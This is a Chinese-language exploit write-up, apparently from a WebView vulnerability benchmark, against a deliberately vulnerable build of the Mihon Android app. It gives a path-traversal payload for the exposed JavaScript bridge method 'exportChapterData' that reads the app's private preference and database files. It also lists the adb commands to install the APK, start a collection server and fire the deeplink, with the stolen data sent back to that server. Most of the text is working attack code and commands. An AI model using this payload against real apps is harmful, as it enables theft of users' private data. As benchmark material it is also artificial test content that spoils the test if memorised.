# 1.2 Insecure JavaScript Bridge Implementation EXP

## 漏洞触发点

Mihon 帮助页 deeplink `mihon://help/webview?url=<external_url>` 将外部 URL 交给 `WebViewActivity`。漏洞样本暴露了 `window.mihonAndroidBridge.exportChapterData(jsonRequest)` 方法，该方法会读取 `jsonRequest` 中指定的文件路径并返回内容，但未做路径校验。

攻击页面构造路径穿梭 payload：

```javascript
mihonAndroidBridge.exportChapterData(JSON.stringify({
    path: "../../../../shared_prefs/mihon_prefs.xml"
}))
```

读取应用私有文件并通过 `/collect?d=<data>` 回传。

## 前置条件

1. 连接 MuMu 模拟器：

```powershell
adb connect 127.0.0.1:7555
```

2. 安装漏洞 APK（`apk/mihon-0.19.9/vuln/1.2.apk`）：

```powershell
adb -s 127.0.0.1:7555 install apk\mihon-0.19.9\vuln\1.2.apk
```

## 运行服务端

```powershell
cd "d:\Secsys\Webview Benchmark&自动化挖掘\Phrase 6\WebviewBench\exp\mihon-0.19.9\1.2_Insecure_JavaScript_Bridge_Implementation"
python .\server.py
```

服务端监听 `0.0.0.0:8000`，攻击页面路径：`http://10.0.2.2:8000/exp/1.2`

回收数据写入 `received/collected_<timestamp>.txt`。

## 触发 exploit

```powershell
adb -s 127.0.0.1:7555 shell am start -a android.intent.action.VIEW -d "mihon://help/webview?url=http%3A%2F%2F10.0.2.2%3A8000%2Fexp%2F1.2"
```

## 预期结果

WebView 加载攻击页面后自动读取应用私有文件。`received/` 目录中出现文件，包含：
- `mihon_prefs.xml` 内容
- `tachiyomi_preferences.xml` 内容
- `mihon.db` 部分内容（数据库文件）
